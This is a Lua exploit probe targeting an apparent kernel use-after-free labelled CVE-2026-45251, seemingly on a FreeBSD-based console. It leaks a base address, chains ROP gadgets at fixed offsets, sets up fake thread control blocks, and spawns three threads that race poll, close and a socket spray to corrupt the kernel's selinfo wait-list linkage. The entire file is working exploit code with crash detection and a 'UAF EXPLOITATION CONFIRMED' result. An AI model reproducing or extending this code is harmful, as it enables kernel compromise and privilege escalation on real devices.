-- CRASH_CLASS: HIGH
-- PROBE 500e: Double-poll confusion on CVE-2026-45251
--
-- 500c proved seldrain missing (150/150 poll=0/rev=0x0 across 5 fd types).
-- 500d proved same-type spray reclaims the freed zone (fd numbers returned)
-- but process survives because new socket's selinfo is clean (empty TAILQ).
--
-- This probe adds a SECOND poll on the spray socket to populate the selinfo:
--   Thread A: poll(target_fd) → links A to target's selinfo → blocks
--   Thread B: close(target_fd) → frees socket (selinfo has A's linkage)
--   Thread B: socket()×N spray → one reclaims the zone
--   Thread C: poll(spray_fd) → links C to the NEW selinfo (same address!)
--   Thread A timeout → seltdclear unlinks A from selinfo that has C's list
--   → TAILQ_REMOVE confusion → kernel corruption or crash
--
-- If A crashes or the kernel panics, the UAF is exploitable.

print("=== PROBE 500e: DOUBLE-POLL confusion (CVE-2026-45251) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))

-- Signal ignore
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Helper: create socketpair gate
local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

-- Shared state: spray fds stored here so Thread C can poll one
local spray_fds = memory.alloc(0x100)  -- room for 32 fds

-- Build Thread A (poller): sysarch → read(gate) → poll(target_fd, POLLIN, 3000) → write marker → exit
local function build_poller(gate_rd, pollfd_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- poll(pollfd, 1, 3000)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(3000))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- Build Thread B (closer+sprayer): sysarch → read(gate) → close(fd) → socket()×N
--   → store first spray fd at spray_fds[0] → write marker → exit
-- Main thread controls gate_C timing (not Thread B).
local function build_closer_spray(gate_rd, target_fd, marker_addr, af, stype, proto)
    local stk = memory.alloc(0xC000)
    local sb = N(stk)
    local rsp = sb + 0x8000 - ((sb + 0x8000) % 16) - 8
    for i = 0, 0x7FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- sysarch(129, &fake_tcb)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    -- read(gate, 1) — block until gate opens
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- close(target_fd)
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6)); emit(stub)
    -- spray: socket()×10, store first spray fd
    for s = 1, 10 do
        emit(g_pop_rdi); emit(uint64(af))
        emit(g_pop_rsi); emit(uint64(stype))
        emit(g_pop_rdx); emit(uint64(proto))
        emit(g_pop_rax); emit(uint64(97)); emit(stub)
        if s == 1 then
            emit(g_pop_rdi); emit(uint64(N(spray_fds)))
            emit(g_mov_m_rax)
        end
    end
    -- write marker (signals main thread that spray is done)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x8000))
    return par
end

-- Build Thread C (second poller): sysarch → read(gate_C) → poll(spray_fd[0], POLLIN, 3000) → write marker → exit
-- This thread polls the SPRAY socket that reclaimed the freed zone.
-- Its selinfo linkage lives at the SAME address as the original freed socket's selinfo.
local function build_second_poller(gate_c_rd, pollfd_c_addr, marker_c_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    -- read(gate_C) — blocks until Thread B signals spray complete
    emit(g_pop_rdi); emit(uint64(gate_c_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- poll(spray_pollfd, 1, 3000)
    emit(g_pop_rdi); emit(uint64(pollfd_c_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(3000))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_c_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function test_doublepoll(label, create_fn, af, stype, proto, iters)
    print("[" .. label .. "] " .. iters .. " iterations")

    local marker_A = memory.alloc(8)   -- poller A result
    local marker_B = memory.alloc(8)   -- closer+spray result
    local marker_C = memory.alloc(8)   -- poller C result
    local pollfd_A = memory.alloc(8)   -- pollfd for Thread A (target fd)
    local pollfd_C = memory.alloc(8)   -- pollfd for Thread C (spray fd)

    local results = {}
    local crashed = false

    for i = 1, iters do
        if not alive() then
            print(string.format("  *** PROCESS DIED at iter %d ***", i))
            crashed = true
            break
        end

        local fd = create_fn()
        if not fd or fd < 0 then
            print("  fd fail at " .. i)
            break
        end

        -- Gates: A (poller start), B (closer start), C (second poller start)
        local gA_r, gA_w = make_gate()
        local gB_r, gB_w = make_gate()
        local gC_r, gC_w = make_gate()
        if not gA_r or not gB_r or not gC_r then
            print("  gate fail at " .. i)
            pcall(function() mk(6)(uint64(fd)) end)
            break
        end

        -- Setup pollfd A for target_fd
        wd(N(pollfd_A), fd)
        wd(N(pollfd_A) + 4, 0x00010000)  -- events=POLLIN, revents=0

        -- Reset
        wq(N(marker_A), uint64(0xAAAAAAAA))
        wq(N(marker_B), uint64(0xBBBBBBBB))
        wq(N(marker_C), uint64(0xCCCCCCCC))
        wq(N(spray_fds), uint64(0xFFFFFFFF))

        -- Thread C's pollfd: fd will be filled in from spray_fds[0] by main thread
        -- after Thread B signals. For now, set fd to -1 (will be updated).
        -- Actually, Thread C reads gate_C AFTER B writes spray_fds[0].
        -- But Thread C's pollfd must already have the spray fd at launch time for
        -- the ROP chain... EXCEPT the ROP chain just passes the pollfd ADDRESS,
        -- and we can update the pollfd contents before opening gate C.
        wd(N(pollfd_C), 0xFFFF)  -- placeholder
        wd(N(pollfd_C) + 4, 0x00010000)

        -- Spawn Thread A (poller on target_fd)
        local parA = build_poller(gA_r, N(pollfd_A), N(marker_A))
        pcall(function() mk(455)(parA, uint64(0x38)) end)

        -- Spawn Thread B (closer + spray, main controls gate_C)
        local parB = build_closer_spray(gB_r, fd, N(marker_B), af, stype, proto)
        pcall(function() mk(455)(parB, uint64(0x38)) end)

        -- Spawn Thread C (second poller on spray_fd — waits on gate_C)
        local parC = build_second_poller(gC_r, N(pollfd_C), N(marker_C))
        pcall(function() mk(455)(parC, uint64(0x38)) end)

        -- Step 1: Open gate A → Thread A enters poll on target_fd → blocks
        pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)

        -- Step 2: Delay for A to reach kernel wait queue (~5ms)
        for d = 1, 50000 do local _ = rd(N(marker_A)) end

        -- Step 3: Open gate B → Thread B: close(fd) + spray
        pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)

        -- Wait for Thread B to finish (spray complete)
        local b_done = false
        for w = 1, 500000 do
            local m = rd(N(marker_B))
            if m and m ~= 0xBBBBBBBB then b_done = true; break end
        end

        -- Step 4: Read spray fd and update Thread C's pollfd
        local spray_fd = rd(N(spray_fds))
        if spray_fd and spray_fd ~= 0xFFFFFFFF and spray_fd > 0 then
            wd(N(pollfd_C), spray_fd)
        end

        -- Step 5: Open gate C → Thread C enters poll on spray_fd
        -- The spray socket reclaimed the freed zone. Thread C's poll links
        -- to that socket's selinfo — same address as the original freed socket's.
        -- Thread A is still sleeping, linked to the same selinfo address.
        -- When A times out, seltdclear finds C's linkage → confusion.
        pcall(function() mk(4)(uint64(gC_w), uint64(N(one_byte)), uint64(1)) end)

        -- Wait for A and C (both have 3s timeout)
        local a_done, c_done = false, false
        for w = 1, 1000000 do
            if not a_done then
                local m = rd(N(marker_A))
                if m and m ~= 0xAAAAAAAA then a_done = true end
            end
            if not c_done then
                local m = rd(N(marker_C))
                if m and m ~= 0xCCCCCCCC then c_done = true end
            end
            if a_done and c_done then break end
        end

        if not alive() then
            print(string.format("  *** CRASHED at iter %d (a=%s b=%s c=%s spray_fd=%s) ***",
                i, tostring(a_done), tostring(b_done), tostring(c_done),
                tostring(spray_fd)))
            crashed = true
            break
        end

        local poll_a = rd(N(marker_A)) or 0xAA
        local poll_c = rd(N(marker_C)) or 0xCC
        local raw_a = rd(N(pollfd_A) + 4) or 0
        local rev_a = math.floor(raw_a / 65536) % 65536
        local raw_c = rd(N(pollfd_C) + 4) or 0
        local rev_c = math.floor(raw_c / 65536) % 65536

        local key = string.format("a=%d/ar=0x%X/c=%d/cr=0x%X/sf=%s",
            poll_a, rev_a, poll_c, rev_c, tostring(spray_fd or "nil"))
        results[key] = (results[key] or 0) + 1

        -- Cleanup: double-close safe
        pcall(function() mk(6)(uint64(fd)) end)
        pcall(function() mk(6)(uint64(gA_r)) end)
        pcall(function() mk(6)(uint64(gA_w)) end)
        pcall(function() mk(6)(uint64(gB_r)) end)
        pcall(function() mk(6)(uint64(gB_w)) end)
        pcall(function() mk(6)(uint64(gC_r)) end)
        pcall(function() mk(6)(uint64(gC_w)) end)
        -- Close spray fds (only know the first one)
        if spray_fd and spray_fd > 0 and spray_fd ~= 0xFFFFFFFF then
            pcall(function() mk(6)(uint64(spray_fd)) end)
        end

        if i % 5 == 0 or i == iters then
            print(string.format("  iter %d/%d (a=%s b=%s c=%s)", i, iters,
                tostring(a_done), tostring(b_done), tostring(c_done)))
        end
    end

    print("  results:")
    for k, v in pairs(results) do
        print("    " .. k .. " × " .. v)
    end
    if crashed then
        print("  >>> UAF EXPLOITATION CONFIRMED <<<")
    end
    print("")
    return not crashed
end

local function mk_udp()
    local r = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
    if r > 0 then return r end return nil
end

local function mk_tcp()
    local r = sgn(mk(97)(uint64(2), uint64(1), uint64(0)))
    if r > 0 then return r end return nil
end

local ITERS = 15

print("=== DOUBLE-POLL TESTS ===")
local ok = true
-- UDP: same-type spray + second poll
if ok then ok = test_doublepoll("UDP double-poll", mk_udp, 2, 2, 17, ITERS) end
-- TCP: same-type spray + second poll
if ok then ok = test_doublepoll("TCP double-poll", mk_tcp, 2, 1, 0, ITERS) end

print("")
if alive() then
    print("ALIVE — process survived double-poll races")
    print("canary=" .. N(native.fcall_with_rax(stub, 20)))
else
    print("*** DEAD — CVE-2026-45251 EXPLOITABLE ***")
end

print("")
print("=== PROBE 500e COMPLETE ===")
